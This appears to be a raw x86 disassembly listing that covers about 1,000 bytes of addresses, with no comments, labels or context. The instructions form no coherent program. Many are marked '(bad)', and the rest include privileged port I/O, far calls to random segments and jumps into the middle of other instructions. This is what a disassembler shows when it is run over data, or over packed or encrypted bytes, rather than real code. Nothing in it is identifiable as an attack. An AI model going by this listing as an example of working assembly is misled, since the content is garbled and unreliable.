  4156bc:	imul   edx,ecx,0x54397fa
  4156c2:	and    al,0xdc
  4156c4:	dec    ebp
  4156c5:	cmp    dl,BYTE PTR [edi+0x65ecbb55]
  4156cb:	ja     0x4156c9
  4156cd:	dec    edi
  4156ce:	sub    eax,0x4f01fbc4
  4156d3:	cwde   
  4156d4:	mov    esi,esp
  4156d6:	sbb    cl,ah
  4156d8:	sub    ah,BYTE PTR [edx-0x3e]
  4156db:	daa    
  4156dc:	idiv   DWORD PTR [edi+0x32d414b8]
  4156e2:	lahf   
  4156e3:	loopne 0x4156ca
  4156e5:	ss dec ebp
  4156e7:	dec    ebx
  4156e8:	or     ecx,0x77
  4156eb:	popf   
  4156ec:	jge    0x41572c
  4156ee:	cmp    eax,0x5dd03ef1
  4156f3:	js     0x415761
  4156f5:	fld    TBYTE PTR [edx-0x76dedcd9]
  4156fb:	sub    edi,DWORD PTR [eax-0x4]
  4156fe:	push   cs
  4156ff:	xlat   BYTE PTR ds:[ebx]
  415700:	lahf   
  415701:	int    0x2c
  415703:	mov    ds:0x567a390a,al
  415708:	cmp    al,0xd5
  41570a:	fwait
  41570b:	sbb    al,0x60
  41570d:	jg     0x415697
  41570f:	popa   
  415710:	seto   BYTE PTR [ecx-0x41]
  415714:	fist   DWORD PTR ss:[ebx+edi*8]
  415718:	enter  0x29ad,0x88
  41571c:	aas    
  41571d:	xchg   esi,eax
  41571e:	dec    edi
  41571f:	cld    
  415720:	cwde   
  415721:	xchg   DWORD PTR [ebp-0xcc896d7],esi
  415727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415728:	cmovle ebx,eax
  41572b:	and    ah,BYTE PTR [edi+0x490961e3]
  415731:	and    BYTE PTR [esi+0x6d],al
  415734:	add    eax,0x42f48b1a
  415739:	add    eax,0xd2166470
  41573e:	or     ebp,DWORD PTR [ebx-0x11]
  415741:	call   FWORD PTR [edi-0x6d3bce7b]
  415747:	shl    DWORD PTR [ebp-0x6f7ee5ca],1
  41574d:	add    ah,bh
  41574f:	cs mov edx,0xaf9ab446
  415755:	and    ebx,DWORD PTR [edi]
  415757:	cmp    eax,0x29d80dc7
  41575c:	icebp  
  41575d:	cmp    dh,BYTE PTR [ebx-0x4a5121c1]
  415763:	xchg   edi,edx
  415765:	(bad)  
  415766:	aam    0x26
  415768:	push   eax
  415769:	repz fadd DWORD PTR [ecx+edi*8+0x6b]
  41576e:	addr16 call 0x41f9:0x5af79bcd
  415776:	sti    
  415777:	sub    eax,0xd80a5f6a
  41577c:	xlat   BYTE PTR ds:[ebx]
  41577d:	mov    ds:0x9612a170,eax
  415782:	inc    ebx
  415783:	scas   al,BYTE PTR es:[edi]
  415784:	cmc    
  415785:	das    
  415786:	add    BYTE PTR [edx+0x6d],ch
  415789:	mov    esp,0x2caca08e
  41578e:	pop    ds
  41578f:	stos   DWORD PTR es:[edi],eax
  415790:	std    
  415791:	(bad)  
  415792:	xchg   edi,eax
  415793:	push   0x30c8785f
  415798:	push   cs
  415799:	push   0xffffffea
  41579b:	push   ss
  41579c:	push   ecx
  41579d:	xor    eax,0x5d4a38ac
  4157a2:	or     bh,bh
  4157a4:	mov    edi,0xbbebf298
  4157a9:	loopne 0x4157f3
  4157ab:	(bad)  
  4157ac:	or     al,0xce
  4157ae:	and    BYTE PTR [edi],bh
  4157b0:	sub    al,0x1e
  4157b2:	jge    0x415781
  4157b4:	outs   dx,DWORD PTR ds:[esi]
  4157b5:	or     esi,esp
  4157b7:	push   ss
  4157b8:	outs   dx,DWORD PTR ds:[esi]
  4157b9:	pop    esp
  4157ba:	sti    
  4157bb:	dec    ecx
  4157bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157bd:	stos   DWORD PTR es:[edi],eax
  4157be:	pop    ebp
  4157bf:	xchg   edi,eax
  4157c0:	fild   DWORD PTR [esi+0x6d]
  4157c3:	and    bl,bl
  4157c5:	dec    edx
  4157c6:	imul   ebx,DWORD PTR [edx-0x13],0xffffffd3
  4157ca:	push   0xbf421622
  4157cf:	clc    
  4157d0:	cli    
  4157d1:	sahf   
  4157d2:	mov    WORD PTR [ebp+0x2de9e915],?
  4157d8:	pop    ds
  4157d9:	mov    cl,0x1f
  4157db:	(bad)  
  4157dd:	jge    0x415774
  4157df:	mov    dh,al
  4157e1:	lds    ecx,FWORD PTR [ebp-0x4a]
  4157e4:	imul   ecx,DWORD PTR [eax+0x1a],0x776631bb
  4157eb:	fwait
  4157ec:	ret    
  4157ed:	sub    cl,BYTE PTR [esi+0x59]
  4157f0:	xor    al,0xa9
  4157f2:	(bad)  
  4157f3:	bound  ebx,QWORD PTR [ecx+0x718ee819]
  4157f9:	and    ebp,ebp
  4157fb:	cmp    eax,0x77a09b82
  415800:	les    ebp,FWORD PTR [esi]
  415802:	sub    ah,ch
  415804:	cdq    
  415805:	sub    cl,dh
  415807:	stc    
  415808:	push   ebp
  415809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41580a:	iret   
  41580b:	loopne 0x415847
  41580d:	dec    ebp
  41580e:	sbb    DWORD PTR [edx-0x2d279ea5],0xfffffffd
  415815:	xor    DWORD PTR [ebx+0x7d],ebp
  415818:	gs mov dl,0xdb
  41581b:	out    0x6e,al
  41581d:	jg     0x415821
  41581f:	fist   DWORD PTR [ecx]
  415821:	cmp    dh,BYTE PTR [ecx+0x6d]
  415824:	push   ss
  415825:	leave  
  415826:	dec    ecx
  415827:	push   0x76
  415829:	jbe    0x415824
  41582b:	lds    ebx,FWORD PTR [esi-0x5c]
  41582e:	and    al,0x55
  415830:	(bad)  
  415831:	xor    al,0x4f
  415833:	shl    BYTE PTR [ebx+0x627ccb08],cl
  415839:	cmp    edi,DWORD PTR [edi+0x31]
  41583c:	scas   eax,DWORD PTR es:[edi]
  41583d:	(bad)  
  41583e:	dec    ebx
  41583f:	int3   
  415840:	xor    al,0xce
  415842:	mov    edi,DWORD PTR [edx+edi*8+0x1a]
  415846:	sub    al,0xef
  415848:	adc    eax,0xe06b9837
  41584d:	or     esp,DWORD PTR [edi-0x3c]
  415850:	add    ebp,DWORD PTR [edx]
  415852:	mov    ecx,fs
  415854:	leave  
  415855:	adc    ah,al
  415857:	pop    ecx
  415858:	nop
  415859:	jecxz  0x41585e
  41585b:	aas    
  41585c:	push   edi
  41585d:	arpl   WORD PTR [edx+0x657c129f],cx
  415863:	std    
  415864:	int3   
  415865:	rol    BYTE PTR [ebx],0x85
  415868:	inc    esi
  415869:	fld    DWORD PTR [ebp+0x5e247c5a]
  41586f:	test   cl,bh
  415871:	bnd jne 0x4158b7
  415874:	ja     0x415816
  415876:	sbb    esi,ebp
  415878:	add    DWORD PTR [ecx],esi
  41587a:	pop    ebx
  41587b:	ds das 
  41587d:	sbb    eax,0xb1f71a47
  415882:	popw   ss
  415884:	pop    edi
  415885:	and    bh,al
  415887:	mov    cl,0xf7
  415889:	out    0xdd,al
  41588b:	leave  
  41588c:	xchg   ebp,eax
  41588d:	push   ebx
  41588e:	jl     0x4158e0
  415890:	xor    BYTE PTR [edi],dl
  415892:	ja     0x4158fe
  415894:	mov    dh,0x5
  415896:	sbb    cl,cl
  415898:	int    0x4c
  41589a:	lds    ebx,FWORD PTR [esi+0x19]
  41589d:	cmp    ch,BYTE PTR [edi+0x30f6a186]
  4158a3:	loope  0x4158ea
  4158a5:	pop    ecx
  4158a6:	repz test BYTE PTR [ecx+eiz*4],cl
  4158aa:	xchg   BYTE PTR [esi-0x59],ah
  4158ad:	dec    ecx
  4158ae:	jb     0x4158de
  4158b0:	lock ja 0x415908
  4158b3:	xor    BYTE PTR [ecx+0x50],cl
  4158b6:	pop    ebp
  4158b7:	xor    al,0xb9
  4158b9:	push   esp
  4158ba:	dec    esp
  4158bb:	jae    0x4158bc
  4158bd:	mov    ebp,0xa144c475
  4158c2:	stos   BYTE PTR es:[edi],al
  4158c3:	call   0x89fb41a9
  4158c8:	sub    eax,0x68050384
  4158cd:	pop    ds
  4158ce:	pop    es
  4158cf:	pusha  
  4158d0:	not    bl
  4158d2:	shl    DWORD PTR [ebx+0x78],1
  4158d5:	clc    
  4158d6:	sbb    BYTE PTR [ebx+0x370afa51],bh
  4158dc:	dec    edi
  4158dd:	sar    DWORD PTR ds:0x404989db,cl
  4158e3:	xchg   edx,eax
  4158e4:	bnd jno 0x415941
  4158e7:	sbb    BYTE PTR [eax],ch
  4158e9:	call   0xfdf7:0xf27ca6
  4158f0:	xor    eax,0xa7006d79
  4158f5:	xchg   ecx,eax
  4158f6:	add    BYTE PTR [ebx-0x66],cl
  4158f9:	pop    es
  4158fa:	in     eax,dx
  4158fb:	dec    ebx
  4158fc:	ins    BYTE PTR es:[edi],dx
  4158fd:	popfw  
  4158ff:	in     al,dx
  415900:	mov    edi,0x9b3a9e86
  415905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415906:	mov    ds:0x9f36110,al
  41590b:	jg     0x41590f
  41590d:	sub    dh,ah
  41590f:	popf   
  415910:	lods   eax,DWORD PTR ds:[esi]
  415911:	sub    ah,BYTE PTR [eax+ebx*1]
  415914:	pop    ebp
  415915:	mov    ecx,DWORD PTR [esp+ebp*2+0x2a]
  415919:	cmp    BYTE PTR [eax+0x3c],0xde
  41591d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41591e:	ja     0x4158a1
  415920:	scas   al,BYTE PTR es:[edi]
  415921:	out    dx,al
  415922:	std    
  415923:	mov    WORD PTR [ecx],es
  415925:	out    dx,al
  415926:	push   ecx
  415927:	or     ebx,DWORD PTR [ebx+0x2c]
  41592a:	pushf  
  41592b:	jnp    0x41594c
  41592d:	mov    cl,0xf8
  41592f:	mov    al,ds:0xee0b366
  415934:	ja     0x415994
  415936:	test   eax,0x3b93a918
  41593b:	xor    edx,ebx
  41593d:	retf   0xdf4d
  415940:	clc    
  415941:	ins    BYTE PTR es:[edi],dx
  415942:	ds int3 
  415944:	scas   al,BYTE PTR es:[edi]
  415945:	mov    eax,ds:0x8f235b74
  41594a:	stos   DWORD PTR es:[edi],eax
  41594b:	mov    ah,0xe8
  41594d:	je     0x415980
  41594f:	and    DWORD PTR [edi-0x7b7ea3b4],edi
  415955:	xchg   ch,dl
  415957:	aam    0x8f
  415959:	jns    0x41593d
  41595b:	lahf   
  41595c:	in     al,0xc9
  41595e:	mov    bh,0x11
  415960:	iret   
  415961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415962:	push   ds
  415963:	sti    
  415964:	pop    ebp
  415965:	ror    ecx,0x42
  415968:	xchg   DWORD PTR [eax-0x74733e98],eax
  41596e:	sub    bl,ch
  415970:	lods   eax,DWORD PTR ds:[esi]
  415971:	pop    edx
  415972:	aad    0xea
  415974:	dec    edx
  415975:	out    0x8a,eax
  415977:	retf   
  415978:	pop    ebp
  415979:	int    0xd0
  41597b:	mov    ebx,0xcb4de2de
  415980:	ins    BYTE PTR es:[edi],dx
  415981:	shr    BYTE PTR [esi],cl
  415983:	jecxz  0x415a04
  415985:	out    0xc3,eax
  415987:	push   0x6d09d1c6
  41598c:	or     BYTE PTR [ecx-0x69],0xa0
  415990:	push   0x75ea55c2
  415995:	and    dl,dh
  415997:	pop    edx
  415998:	mov    es,edx
  41599a:	lods   eax,DWORD PTR ds:[esi]
  41599b:	or     eax,0xacc98ee
  4159a0:	push   eax
  4159a1:	dec    ebp
  4159a2:	pop    edx
  4159a3:	mov    eax,0x87385b1f
  4159a8:	cwde   
  4159a9:	pop    edi
  4159aa:	cmp    DWORD PTR [edx-0x15],edi
  4159ad:	mov    WORD PTR ds:[ecx-0x7b305b7],?
  4159b4:	outs   dx,BYTE PTR ds:[esi]
  4159b5:	cmp    al,0x13
  4159b7:	cdq    
  4159b8:	hlt    
  4159b9:	fidiv  DWORD PTR [eax]
  4159bb:	pop    ecx
  4159bc:	lock xchg ecx,eax
  4159be:	xchg   ebx,eax
  4159bf:	add    al,0x66
  4159c1:	mov    ds:0xcf89c017,al
  4159c6:	retf   
  4159c7:	pop    es
  4159c8:	clc    
  4159c9:	ficomp WORD PTR [eax+0x4a]
  4159cc:	mov    dh,0xef
  4159ce:	cmp    DWORD PTR [esi-0x6],ebp
  4159d1:	jbe    0x415a12
  4159d3:	jnp    0x415a23
  4159d5:	ror    DWORD PTR [eax-0x13],cl
  4159d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159d9:	stc    
  4159da:	xchg   edx,eax
  4159db:	es mov ebx,0x35157632
  4159e1:	pushf  
  4159e2:	cmp    DWORD PTR [ebx+0x298b1912],ebp
  4159e8:	(bad)  [ecx+0x48]
  4159eb:	push   0x1ba71dde
  4159f0:	add    DWORD PTR [eax+0x6ac237d7],edx
  4159f6:	clc    
  4159f7:	adc    al,0x41
  4159f9:	push   eax
  4159fa:	push   es
  4159fb:	mov    ah,0xed
  4159fd:	mov    bh,0xc6
  4159ff:	add    DWORD PTR [edx],ecx
  415a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a02:	pop    esi
  415a03:	(bad)  
  415a04:	push   eax
  415a05:	into   
  415a06:	jb     0x415a47
  415a08:	icebp  
  415a09:	push   ecx
  415a0a:	bound  edx,QWORD PTR [ebp+0x7a]
  415a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0e:	add    al,0xa2
  415a10:	xor    dh,al
  415a12:	(bad)
  415a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a16:	xlat   BYTE PTR fs:[ebx]
  415a18:	cmp    BYTE PTR [ebx-0x329e6918],dh
  415a1e:	fs test al,0x44
  415a21:	dec    ebx
  415a22:	cmp    BYTE PTR [ebx-0x215cedac],ch
  415a28:	mov    dh,cl
  415a2a:	int    0xfd
  415a2c:	jbe    0x4159b6
  415a2e:	jns    0x415a34
  415a30:	mov    ecx,0xa9416ab4
  415a35:	sub    BYTE PTR [esi+ecx*2+0x3a],bl
  415a39:	dec    dx
  415a3b:	xor    bl,0xa0
  415a3e:	cmp    BYTE PTR ds:0x8d981f44,al
  415a44:	cmp    DWORD PTR [ebx],0x2b
  415a47:	inc    edx
  415a48:	fiadd  DWORD PTR [edi]
  415a4a:	mov    ecx,0x5117b551
  415a4f:	adc    BYTE PTR [ebx+0x2f],ch
  415a52:	jbe    0x415abd
  415a54:	inc    esi
  415a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a56:	jecxz  0x4159e9
  415a58:	mov    bh,0xd1
  415a5a:	jo     0x415aa6
  415a5c:	aad    0xbf
  415a5e:	ds push ebp
  415a60:	js     0x415a12
  415a62:	cmp    DWORD PTR [ebp+0x6b9deb12],ebx
  415a68:	xchg   esp,eax
  415a69:	retf   
  415a6a:	popa   
  415a6b:	push   ebp
  415a6c:	pop    es
  415a6d:	mov    WORD PTR [esi],ds
  415a6f:	mov    ebp,esi
  415a71:	cmp    al,0xa6
  415a73:	inc    ecx
  415a74:	cdq    
  415a75:	daa    
  415a76:	add    DWORD PTR [ebx-0x45b153c6],esi
  415a7c:	ds icebp 
  415a7e:	nop
  415a7f:	(bad)  
  415a80:	lods   al,BYTE PTR ds:[esi]
  415a81:	cld    
  415a82:	push   eax
  415a83:	sub    ebp,DWORD PTR [edx-0x45029c9e]
  415a89:	fiadd  WORD PTR [eax+0x43f1203f]
  415a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a90:	mov    ebp,0x22702533
  415a95:	aad    0xc3
  415a97:	and    al,BYTE PTR [esi]
  415a99:	stos   DWORD PTR es:[edi],eax
  415a9a:	sub    eax,0x80a3055c
  415a9f:	out    0xdd,al
  415aa1:	inc    edi
  415aa2:	frstor [ebx+eax*8]
  415aa5:	bound  edx,QWORD PTR [ecx-0x4c588c98]
  415aab:	jmp    0xf984:0x5a9d9d06
  415ab2:	xchg   esi,eax
  415ab3:	stos   DWORD PTR es:[edi],eax
  415ab4:	sub    eax,DWORD PTR [ecx+0x74]
  415ab7:	xchg   edi,eax
  415ab8:	push   ebx
  415ab9:	div    edi
  415abb:	mov    dh,0xdb
  415abd:	retf   
  415abe:	test   bl,bh
  415ac0:	mov    ds:0x89e082a3,al
  415ac5:	fmul   DWORD PTR [edi+0x64]
  415ac8:	enter  0x27a8,0x9b
  415acc:	jne    0x415a5d
  415ace:	sahf   
  415acf:	sub    eax,DWORD PTR [ecx+0x5b]
  415ad2:	jns    0x415a97
  415ad4:	jecxz  0x415a78
  415ad6:	jl     0x415b4b
  415ad8:	aaa    
  415ad9:	xchg   esi,eax
  415ada:	js     0x415ab8
  415adc:	mov    edx,0xbfe817f9
  415ae1:	push   esi
  415ae2:	pusha  
  415ae3:	mov    esi,DWORD PTR [ebp-0x4e]
  415ae6:	push   ss
  415ae7:	adc    eax,DWORD PTR [edi+0x4bdfcb5c]
  415aed:	std    
  415aee:	ficom  WORD PTR [edi]
  415af0:	adc    bh,dl
  415af2:	mov    esi,0x8ffa5ff9
  415af7:	mov    BYTE PTR [ecx],0xa3
  415afa:	fdiv   QWORD PTR [esi]
  415afc:	scas   al,BYTE PTR es:[edi]
  415afd:	aas    
  415afe:	aaa    
  415aff:	scas   al,BYTE PTR es:[edi]
  415b00:	(bad)  
  415b01:	fld    DWORD PTR [edx]
  415b03:	cmp    eax,0x4c3b7b35
  415b08:	jmp    0x415a9d
  415b0a:	les    esp,FWORD PTR [edx-0x640a4e4e]
  415b10:	fnstenv [edi-0x2e05f08d]
  415b16:	cdq    
  415b17:	jl     0x415b77
  415b19:	jmp    0x6a69:0x490c4418
  415b20:	dec    edx
  415b21:	leave  
  415b22:	and    DWORD PTR [eax+0x3355a43],0x4539bef6
  415b2c:	data16 fadd st,st(3)
  415b2f:	xchg   ebp,eax
  415b30:	push   0xffffff98
  415b32:	adc    al,0xb3
  415b34:	mov    edx,0x6d9eeb48
  415b39:	sbb    al,0x2b
  415b3b:	adc    ch,ah
  415b3d:	mov    al,0x91
  415b3f:	add    eax,0x91903f2b
  415b44:	xor    BYTE PTR [esi-0x62bad4ef],bl
  415b4a:	push   0xb
  415b4c:	mov    dl,0x62
  415b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b4f:	in     eax,dx
  415b50:	call   0xb5c9242c
  415b55:	fisttp DWORD PTR [edx+0x22]
  415b58:	pop    ss
  415b59:	stos   BYTE PTR es:[edi],al
  415b5a:	lods   eax,DWORD PTR ds:[esi]
  415b5b:	xchg   ecx,eax
  415b5c:	mov    bh,0xf4
  415b5e:	add    BYTE PTR [eax+0x2e2d3af6],bh
  415b64:	ret    0x2a8c
  415b67:	mov    edx,0xb2f1adb2
  415b6c:	pop    edx
  415b6d:	(bad)  
  415b6e:	push   ecx
  415b6f:	push   ebx
  415b70:	lock (bad) 
  415b72:	jmp    0x415b9b
  415b74:	rol    BYTE PTR ss:[edi],cl
  415b77:	(bad)  
  415b78:	mov    al,0x36
  415b7a:	call   0x4f93e3af
  415b7f:	xchg   edx,eax
  415b80:	stos   BYTE PTR es:[edi],al
  415b81:	(bad)  
  415b82:	mov    ds:0xdd9192ae,eax
  415b87:	xchg   edi,eax
  415b88:	sbb    eax,0xee151f4d
  415b8d:	lock and BYTE PTR [di],dl
  415b91:	test   eax,0x76d620bf
  415b96:	fnstcw WORD PTR [ebx+0x6b]
  415b99:	mov    ?,ebx
  415b9b:	rol    DWORD PTR es:[edi-0x375c7281],cl
  415ba2:	jno    0x415b9d
  415ba4:	or     bh,al
  415ba6:	cmp    ebx,DWORD PTR [esi+0x51]
  415ba9:	es mov al,0xfa
  415bac:	cwde   
  415bad:	std    
  415bae:	sub    al,0x41
  415bb0:	push   edi
  415bb1:	out    0x1,al
  415bb3:	cli    
  415bb4:	or     eax,0xd97cd73e
  415bb9:	sub    BYTE PTR [eax+ebx*2],cl
  415bbc:	fidiv  WORD PTR [eax+0x53]
  415bbf:	clc    
  415bc0:	in     eax,dx
  415bc1:	and    eax,0xd32aa75
  415bc6:	mov    bh,0xa4
  415bc8:	repnz in al,dx
  415bca:	outs   dx,BYTE PTR ds:[esi]
  415bcb:	add    al,0x2f
  415bcd:	push   ebx
  415bce:	arpl   WORD PTR [esi-0x9],sp
  415bd1:	push   ecx
  415bd2:	mov    eax,ds:0x42b7d156
  415bd7:	in     al,0xc3
  415bd9:	xor    al,0x2b
  415bdb:	icebp  
  415bdc:	push   eax
  415bdd:	jl     0x415b7c
  415bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415be0:	leave  
  415be1:	sub    BYTE PTR [ebx+0x9abc375],dh
  415be7:	xor    eax,0x231adf55
  415bec:	sbb    dl,BYTE PTR [ebx+0x782eb9f6]
  415bf2:	jle    0x415c3e
  415bf4:	sbb    esp,edx
  415bf6:	inc    esp
  415bf7:	cli    
  415bf8:	dec    esi
  415bf9:	retf   0xaf4d
  415bfc:	lds    ebp,FWORD PTR [ebx]
  415bfe:	xor    al,bl
  415c00:	cmp    al,0xb6
  415c02:	retf   
  415c03:	inc    ebp
  415c04:	fidivr WORD PTR [edi+0x35]
  415c07:	jg     0x415ba5
  415c09:	(bad)  
  415c0a:	(bad)  [esi+edx*8-0x2eed4887]
  415c11:	push   0xffffffda
  415c13:	mov    ecx,0x136177a7
  415c18:	jb     0x415ba1
  415c1a:	xor    al,0xb6
  415c1c:	inc    ebx
  415c1d:	mov    DWORD PTR [ebx+0x36],esp
  415c20:	or     ax,0x686e
  415c24:	adc    BYTE PTR [esi-0x5a],dl
  415c27:	adc    al,0xfd
  415c29:	in     eax,0x57
  415c2b:	push   edi
  415c2c:	iret   
  415c2d:	xor    eax,0xfc0e5f6f
  415c32:	mov    ecx,0x8234c928
  415c37:	imul   esp,DWORD PTR [eax-0x23],0x4f
  415c3b:	sub    al,0xd6
  415c3d:	jne    0x415c1d
  415c3f:	xor    dh,cl
  415c41:	dec    ebp
  415c42:	and    dh,cl
  415c44:	dec    ecx
  415c45:	clc    
  415c46:	icebp  
  415c47:	js     0x415c49
  415c49:	adc    al,0xf6
  415c4b:	mov    al,0x4
  415c4d:	mov    eax,ds:0xa7f1642c
  415c52:	pop    eax
  415c53:	(bad)  [ecx]
  415c55:	fcmovb st,st(2)
  415c57:	loopne 0x415c98
  415c59:	cmp    DWORD PTR [esi-0x1732406],esi
  415c5f:	add    eax,0xe500fa3f
  415c64:	repz (bad) 
  415c66:	pop    esi
  415c67:	dec    ebx
  415c68:	cli    
  415c69:	mov    ecx,0xd6a18af3
  415c6e:	adc    DWORD PTR [edx-0x751ccb77],eax
  415c74:	(bad)  
  415c75:	xor    ebp,DWORD PTR [edx+0x34]
  415c78:	jns    0x415c2f
  415c7a:	push   es
  415c7b:	push   ss
  415c7c:	jecxz  0x415c40
  415c7e:	mov    ch,0x6f
  415c80:	cwde   
  415c81:	jne    0x415c53
  415c83:	clc    
  415c84:	js     0x415c15
  415c86:	add    esi,DWORD PTR [edi-0x79c316f0]
  415c8c:	imul   edx,DWORD PTR [ecx+edi*1-0x151603ed],0x132b4dee
  415c97:	pop    ss
  415c98:	in     al,dx
  415c99:	dec    ebp
  415c9a:	les    ebp,FWORD PTR [ebp+0x7f]
  415c9d:	std    
  415c9e:	mov    WORD PTR [ecx+0x4be6105b],?
  415ca4:	stc    
  415ca5:	test   eax,0x6b33cdf9
  415caa:	xor    DWORD PTR [eax],edx
  415cac:	jp     0x415ccc
  415cae:	and    al,0xde
  415cb0:	pusha  
  415cb1:	les    ebp,FWORD PTR [eax-0x48]
  415cb4:	bound  ebp,QWORD PTR [ebp-0x5af66e1d]
  415cba:	out    0xcf,al
  415cbc:	mov    dl,BYTE PTR [edi-0x82800d5]
  415cc2:	out    dx,al
  415cc3:	jb     0x415d16
  415cc5:	sahf   
  415cc6:	xchg   edx,eax
  415cc7:	mov    DWORD PTR [ecx-0x12b3cbf2],ecx
  415ccd:	push   ss
  415cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ccf:	sub    BYTE PTR [edx+ecx*8-0xedd548d],bl
  415cd6:	push   0xffffff9b
  415cd8:	and    esi,DWORD PTR [ecx+ebp*4-0x1a]
  415cdc:	sbb    eax,0x865fe2c8
  415ce1:	dec    esi
  415ce2:	iret   
  415ce3:	mov    edx,0xce65c2e5
  415ce8:	cs pop eax
  415cea:	dec    esp
  415ceb:	pop    esi
  415cec:	push   ss
  415ced:	push   ecx
  415cee:	mov    BYTE PTR [esi-0x60463de],bh
  415cf4:	jle    0x415c8a
  415cf6:	xchg   ecx,eax
  415cf7:	stc    
  415cf8:	xlat   BYTE PTR ds:[ebx]
  415cf9:	mov    bh,0x53
  415cfb:	jb     0x415c86
  415cfd:	test   al,0x7d
  415cff:	rol    DWORD PTR [ecx],1
  415d01:	sub    esi,esi
  415d03:	xor    eax,0x17385442
  415d08:	(bad)
  415d0b:	cli    
  415d0c:	and    BYTE PTR [ecx],bh
  415d0e:	test   DWORD PTR [edi],edi
  415d10:	out    dx,al
  415d11:	pop    ebp
  415d12:	pusha  
  415d13:	xchg   ecx,eax
  415d14:	sti    
  415d15:	and    BYTE PTR [edi-0x5c30c106],cl
  415d1b:	adc    edx,ecx
  415d1d:	cmp    BYTE PTR [eax+0x7ddc4ef2],0xf4
  415d24:	add    BYTE PTR [ebx],al
  415d26:	cmc    
  415d27:	in     al,dx
  415d28:	cld    
  415d29:	cmp    DWORD PTR [esi+edi*8-0x66],esp
  415d2d:	test   DWORD PTR [esi-0x47445250],eax
  415d33:	shl    DWORD PTR [ebx],0x24
  415d36:	pop    edx
  415d37:	popf   
  415d38:	mov    WORD PTR [ebx+0x907c15c],es
  415d3e:	sub    edx,DWORD PTR ds:0x536e2ec7
  415d44:	test   BYTE PTR [edx],bl
  415d46:	out    0x7b,eax
  415d48:	inc    edi
  415d49:	int3   
  415d4a:	push   ebx
  415d4b:	jnp    0x415db7
  415d4d:	inc    ebp
  415d4e:	es push 0x93ae5635
  415d54:	inc    esi
  415d55:	push   0x6f
  415d57:	icebp  
  415d58:	push   esp
  415d59:	bound  edx,QWORD PTR [ebp-0x43892792]
  415d5f:	int3   
  415d60:	jmp    0x415d8b
  415d62:	call   0xe740:0xd2bc24a5
  415d69:	adc    cl,dh
  415d6b:	add    DWORD PTR [edx+0x316ebb00],0xffffffa8
  415d72:	or     al,0x3b
  415d74:	pushf  
  415d75:	in     eax,dx
  415d76:	cmc    
  415d77:	or     eax,0x8e34c001
  415d7c:	jecxz  0x415d7a
  415d7e:	arpl   WORD PTR [edx+0x79],bp
  415d81:	mov    dh,0xa
  415d83:	shr    ah,cl
  415d85:	aad    0x81
  415d87:	xor    dl,BYTE PTR [esp+edx*2]
  415d8a:	pushf  
  415d8b:	pop    ebp
  415d8c:	outs   dx,BYTE PTR ds:[esi]
  415d8d:	xchg   esi,eax
  415d8e:	(bad)  
  415d90:	sub    eax,0xe2d1d1b5
  415d95:	xchg   esp,eax
  415d96:	arpl   WORD PTR [esi],sp
  415d98:	frstor [ebp-0x1]
  415d9b:	or     DWORD PTR [edx-0x5a09d9d8],ebp
  415da1:	add    eax,0x15352a17
  415da6:	xchg   edx,eax
  415da7:	(bad)  
  415da8:	push   ebx
  415da9:	and    edi,DWORD PTR [ebx-0x66]
  415dac:	dec    edi
  415dad:	push   ebx
  415dae:	mov    ebx,DWORD PTR [ebx-0x48]
  415db1:	sbb    BYTE PTR [ecx],al
  415db3:	sbb    al,0x95
  415db5:	mov    esp,0xdda60c25
  415dba:	lahf   
  415dbb:	pop    esp
  415dbc:	or     al,0x42
  415dbe:	(bad)  
  415dbf:	and    eax,0x4410d726
  415dc4:	pop    esp
  415dc5:	hlt    
  415dc6:	fcomp  QWORD PTR [eax+0x10419df6]
  415dcc:	adc    edi,DWORD PTR [edx+0x27]
  415dcf:	push   cs
  415dd0:	or     esi,esp
  415dd2:	add    eax,0x5611177d
  415dd7:	and    ebp,DWORD PTR [esi+0x59]
  415dda:	lods   al,BYTE PTR ds:[esi]
  415ddb:	inc    esi
  415ddc:	adc    DWORD PTR [ecx+ebx*1],ecx
  415ddf:	sbb    ebx,DWORD PTR [esi]
  415de1:	fdivr  DWORD PTR [ebx-0x7905f30c]
  415de7:	stos   DWORD PTR es:[edi],eax
  415de8:	xchg   ebx,esi
  415dea:	jmp    0x88e25f1e
  415def:	in     al,0xe6
  415df1:	and    DWORD PTR [ebx],ecx
  415df3:	pop    ss
  415df4:	pusha  
  415df5:	adc    eax,0x1e9a10af
  415dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dfb:	adc    al,0xe4
  415dfd:	add    cl,BYTE PTR [ebx+0x6e75783d]
  415e03:	mov    esp,0x927f6c76
  415e08:	pop    es
  415e09:	hlt    
  415e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e0b:	and    eax,DWORD PTR [ecx+0x74a1c6a9]
  415e11:	xor    dh,BYTE PTR [edi]
  415e13:	jg     0x415e00
  415e15:	mov    bl,0x6b
  415e17:	rcl    DWORD PTR [eax-0x33],0x36
  415e1b:	fsubr  QWORD PTR [edi-0x1e8b86f5]
  415e21:	xor    al,0x35
  415e23:	or     eax,esp
  415e25:	inc    esi
  415e26:	push   cs
  415e27:	inc    edi
  415e28:	sahf   
  415e29:	or     BYTE PTR [edx-0x517861e6],dl
  415e2f:	sub    BYTE PTR [ecx],0x7d
  415e32:	sbb    ebp,edx
  415e34:	imul   edi,DWORD PTR [ebp-0x62],0xbdf7d2ec
  415e3b:	aas    
  415e3c:	push   es
  415e3d:	into   
  415e3e:	repz jg 0x415df2
  415e41:	in     al,dx
  415e42:	mov    edi,0xb653fd21
  415e47:	inc    esp
  415e48:	adc    bl,BYTE PTR [ecx-0x41]
  415e4b:	test   al,0xc7
  415e4d:	retfw  
